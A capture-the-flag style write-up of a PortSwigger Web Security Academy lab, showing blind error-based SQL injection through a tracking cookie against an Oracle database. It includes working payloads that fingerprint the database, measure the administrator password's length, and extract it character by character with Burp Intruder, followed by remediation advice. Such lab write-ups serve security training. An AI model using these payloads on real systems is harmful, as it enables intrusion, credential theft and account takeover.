# Lab: Blind SQL Injection with Conditional Errors

* **Platform:** PortSwigger Web Security Academy
* **Category:** SQL Injection (Blind)
* **Difficulty:** Practitioner
* **Database Backend:** Oracle
* **Target Host:** `0a28000804300f70803a08de00c30038.web-security-academy.net`
* **Tools Used:** Burp Suite Community Edition (Proxy, Repeater, Intruder)

---

## 1. Lab Overview

This application contains a blind SQL injection vulnerability within the `TrackingId` analytics cookie (`UX67TthmcYJfOJKe`). The backend executes a SQL query containing the value of the submitted cookie. 

* The results of the SQL query are not returned in the HTTP response.
* The application does not display any behavioral differences based on whether the query returns rows.
* If the SQL query triggers a database error, the application returns a custom HTTP `500 Internal Server Error` message.

**Objective:** Exploit the conditional error behavior to extract the `administrator` password from the `users` table and log into the account.

---

## 2. Vulnerability Detection & Database Fingerprinting

1. **Intercept the Request:** Captured a `GET /filter?category=Tech+gifts` request containing the `TrackingId` cookie using **Burp Proxy** and sent it to **Burp Repeater**.
2. **Test for Syntax Errors:**
   * Appended a single quote (`'`) to the cookie value:
     ```http
     Cookie: TrackingId=UX67TthmcYJfOJKe'
     ```
     **Result:** The server returned a `500 Internal Server Error`.
   * Appended two single quotes (`''`) to close the string:
     ```http
     Cookie: TrackingId=UX67TthmcYJfOJKe''
     ```
     **Result:** The `500` error disappeared and a `200 OK` response was returned, confirming SQL injection.
3. **Fingerprint the Database (Oracle):**
   * Tested standard subquery concatenation:
     ```sql
     TrackingId=UX67TthmcYJfOJKe'||(SELECT '')||'
     ```
     **Result:** Returned an error, indicating the database requires a `FROM` clause.
   * Tested Oracle's built-in `dual` table:
     ```sql
     TrackingId=UX67TthmcYJfOJKe'||(SELECT '' FROM dual)||'
     ```
     **Result:** Returned `200 OK`, confirming an **Oracle** database.
   * Verified SQL execution by querying a non-existent table:
     ```sql
     TrackingId=UX67TthmcYJfOJKe'||(SELECT '' FROM not-a-real-table)||'
     ```
     **Result:** Returned `500 Internal Server Error`.

---

## 3. Exploitation Methodology

### Step 1: Verify the `users` Table and `administrator` Account
To confirm the `users` table exists without breaking string concatenation (which fails if multiple rows are returned), `ROWNUM = 1` was used:
```sql
TrackingId=UX67TthmcYJfOJKe'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```
* **Result:** `200 OK` (Table exists).

Next, a conditional `CASE` statement utilizing a divide-by-zero (`TO_CHAR(1/0)`) was constructed to trigger a `500` error only when a condition evaluates to `TRUE`:
```sql
TrackingId=UX67TthmcYJfOJKe'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
* **Result:** `500 Internal Server Error` (Confirmed the `administrator` user exists).

### Step 2: Enumerate Password Length
Using Burp Repeater, the `LENGTH()` function was used to determine the exact length of the `administrator` password:
```sql
TrackingId=UX67TthmcYJfOJKe'||(SELECT CASE WHEN LENGTH(password)>19 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
* `LENGTH(password)>19` → `500 Internal Server Error` (True)
* `LENGTH(password)>20` → `200 OK` (False)

**Conclusion:** The `administrator` password is **20 characters** long.

### Step 3: Extract Password Characters via Burp Intruder
To extract the 20-character password, the request was sent to **Burp Intruder** using a **Cluster Bomb** attack type with the following HTTP request and payload markers:

```http
GET /filter?category=Tech+gifts HTTP/2
Host: 0a28000804300f70803a08de00c30038.web-security-academy.net
Cookie: TrackingId=UX67TthmcYJfOJKe'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'; session=OlxH59Zj5rMOxZURxHtsojjzOE05HHCE
```

* **Payload Set 1 (Position):** Numbers `1` through `20` (Step: `1`).
* **Payload Set 2 (Character):** Character list `a-z`, `0-9`.
* **Analysis:** Filtered the Intruder results by **Status Code `500`**. Every `500` response revealed the exact character for that specific index position.

---

## 4. Impact & Resolution

1. Reconstructed the 20-character password from the Burp Intruder results.
2. Navigated to the login page and authenticated as `administrator`.
3. Accessed the **My Account** page, completing the lab.

---

## 5. Remediation

To prevent blind SQL injection vulnerabilities:
* **Use Parameterized Queries (Prepared Statements):** Ensure user-supplied input (including HTTP cookies and headers) is treated strictly as data rather than executable SQL code.
* **Implement Generic Error Handling:** Configure the application and web server to catch database exceptions gracefully without exposing differing HTTP status codes (`500` vs. `200`) based on query execution outcomes.
